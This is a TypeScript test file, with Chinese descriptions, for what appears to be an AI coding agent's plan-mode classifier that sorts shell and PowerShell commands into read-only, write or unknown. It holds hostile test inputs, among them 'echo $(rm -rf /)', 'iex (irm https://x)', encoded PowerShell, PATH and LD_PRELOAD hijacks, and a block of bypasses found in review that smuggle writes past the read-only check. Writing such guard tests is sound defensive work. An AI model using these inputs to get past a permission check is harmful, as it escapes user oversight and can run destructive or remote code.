import { describe, expect, it } from "vitest";
import { classifyCommand, splitSegments } from "./readonly.ts";

const bash = (c: string) => classifyCommand(c, false);
const ps = (c: string) => classifyCommand(c, true);

describe("计划模式的只读命令判定", () => {
  it("按管道、;、&&、|| 与换行拆段，引号内不拆", () => {
    expect(splitSegments("git status && ls | wc -l; echo 'a|b'")).toEqual([
      "git status",
      "ls",
      "wc -l",
      "echo 'a|b'",
    ]);
  });

  it("bash 的单个 & 拆段，重定向里的 & 不拆；PowerShell 的调用符不拆", () => {
    expect(splitSegments("ls & touch out.txt")).toEqual(["ls", "touch out.txt"]);
    expect(splitSegments("ls 2>&1 &>/dev/null")).toEqual(["ls 2>&1 &>/dev/null"]);
    expect(splitSegments("& .\\build.ps1", true)).toEqual(["& .\\build.ps1"]);
  });

  it("审查发现的绕过：后台 &、紧贴的重定向、引号里的命令替换、带路径的命令、写文件参数", () => {
    for (const c of [
      "ls & touch out.txt",
      "echo hi>out.txt",
      "ls&>out.txt",
      "sort -o out.txt input.txt",
      "sort --output=out.txt in",
      "git diff --output=out.patch",
      "uniq in.txt out.txt",
      "tree -o out.txt",
    ])
      expect(bash(c), c).toBe("write");
    for (const c of [
      'echo "$(touch out.txt)"',
      'echo "`touch out.txt`"',
      "env touch out.txt",
      "./ls",
      "/tmp/x/cat a",
      "git -c core.pager='touch x' log",
      "rg --pre ./x foo",
      "fd -x rm",
      "FOO=1 ls",
      "PATH=/tmp/evil ls",
      "LD_PRELOAD=/tmp/x.so cat a",
      "sed 'w out.txt' in.txt",
      "sed -n 's/a/b/w out.txt' in",
      "sed 's/.*/date/e' in",
      "sed -f script.sed in",
      "sed --expression='w out.txt' in",
      "sed --expression 's/a/b/e' in",
      "sed -e'w out' in",
      "sed -ne's/a/b/w out' in",
    ])
      expect(bash(c), c).toBe("unknown");
    expect(bash("echo '$(touch out.txt)'")).toBe("readonly");
    expect(bash("FOO=1")).toBe("write");
    expect(bash("sed -n 1,40p a.ts")).toBe("readonly");
    expect(bash("sed 's/a/b/g' a.ts")).toBe("readonly");
    expect(
      ps("Get-ChildItem | ForEach-Object { powershell -Command 'Set-Content out.txt x' }"),
    ).toBe("unknown");
    expect(ps('Write-Output "$(Remove-Item a)"')).toBe("unknown");
    expect(ps("C:\\tools\\ls.exe")).toBe("unknown");
  });

  it("bash：只读命令放行", () => {
    for (const c of [
      "ls -la",
      "cat src/a.ts",
      "rg -n plan src",
      "grep -rn foo . | head -20",
      "find . -name '*.ts'",
      "git status",
      "git log --oneline -5",
      "git diff HEAD~1 -- src",
      "git -C ../x show HEAD",
      "git branch",
      "git branch -a",
      "pnpm ls",
      "npm view react version",
      "node -v",
      "sed -n 1,40p a.ts",
      "wc -l a.ts 2>/dev/null",
      "ls 2>&1 | sort",
      "tree -L 2",
      "jq .name package.json",
    ])
      expect(bash(c), c).toBe("readonly");
  });

  it("bash：修改类命令拒绝", () => {
    for (const c of [
      "rm -rf dist",
      "mv a b",
      "echo hi > a.txt",
      "cat a >> b",
      "ls && touch x",
      "git commit -m x",
      "git push",
      "git checkout -b x",
      "git branch -D old",
      "git stash",
      "npm install lodash",
      "pnpm add react",
      "sed -i s/a/b/ f",
      "sudo ls",
      "tee out.txt",
      "mkdir x",
    ])
      expect(bash(c), c).toBe("write");
  });

  it("bash：判断不了的交给用户", () => {
    for (const c of [
      "pnpm test",
      "cargo build",
      "node scripts/x.js",
      "echo $(rm -rf /)",
      "ls `pwd`",
      "bash -c 'ls'",
      "find . -delete",
      "make",
      "python3 -c 'print(1)'",
    ])
      expect(bash(c), c).toBe("unknown");
  });

  it("PowerShell：只读 cmdlet 放行", () => {
    for (const c of [
      "Get-ChildItem -Recurse -Filter *.ts",
      "gci src",
      "Get-Content a.ts -TotalCount 40",
      "Select-String -Path *.ts -Pattern plan",
      "Get-ChildItem | Where-Object { $_.Length -gt 1000 } | Select-Object Name",
      "Test-Path .\\a.ts",
      "git status 2>$null",
      "Get-Content a.json | ConvertFrom-Json",
      "$PSVersionTable",
      "dir",
      "type a.txt",
      "findstr /s plan *.ts",
      "Get-FileHash a.msi",
      "Get-ChildItem | Where-Object { $_.Length -gt 1000 }",
      "Get-ChildItem | Where-Object { $_.Name -eq 'a=b' }",
    ])
      expect(ps(c), c).toBe("readonly");
  });

  it("PowerShell：修改类命令拒绝", () => {
    for (const c of [
      "Remove-Item -Recurse dist",
      "Set-Content a.txt 'x'",
      "Get-Content a | Out-File b",
      "New-Item -ItemType Directory x",
      "Copy-Item a b",
      "'x' > a.txt",
      "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
      "Invoke-WebRequest https://x -OutFile y",
      "del a.txt",
    ])
      expect(ps(c), c).toBe("write");
  });

  it("PowerShell：判断不了的交给用户", () => {
    for (const c of [
      "pnpm test",
      "iex (irm https://x)",
      "Invoke-Expression $s",
      "powershell -EncodedCommand AAA",
      "& .\\build.ps1",
      "Get-Content $(Get-Item a)",
      "$env:PATH = 'C:\\evil'; git status",
      "$x = 1",
      // biome-ignore lint/suspicious/noTemplateCurlyInString: PowerShell 的 ${function:…} 变量写法
      "${function:Get-ChildItem} = { Remove-Item a }",
      "Get-ChildItem | ForEach-Object { $env:X = 1 }",
      "Get-ChildItem | ForEach-Object { $_.IsReadOnly = $false }",
      "Get-ChildItem | Where-Object { $global:n += 1 }",
      "Get-ChildItem | Sort-Object -Property { Remove-Item out.txt; $_.Name }",
      // sort、where 等通用白名单里的名字在 PowerShell 里是 cmdlet 别名
      "Get-ChildItem | sort { Remove-Item out.txt }",
      "Get-ChildItem | where { & 'Remove-Item' a }",
      "Get-ChildItem | where { . { Remove-Item a } }",
      "Get-ChildItem | where { [IO.File]::Delete('a') }",
      // git 只读子命令调用外部程序
      "git grep -O sh key",
      "git grep --open-files-in-pager=sh key",
      "git log -p --ext-diff",
      "git show --textconv HEAD",
      "git cat-file --filters HEAD:a",
      "git --exec-path=/tmp log",
      "git help -w log",
      "Get-ChildItem | Select-Object @{ n = 'x'; e = { Remove-Item a } }",
      "Get-ChildItem | ForEach-Object { $x = Remove-Item out.txt }",
      "Get-ChildItem | ForEach-Object { ($null = Remove-Item a) }",
      "Get-ChildItem | Where-Object { $_.Name -eq (Remove-Item a) }",
    ])
      expect(ps(c), c).toBe("unknown");
  });
});
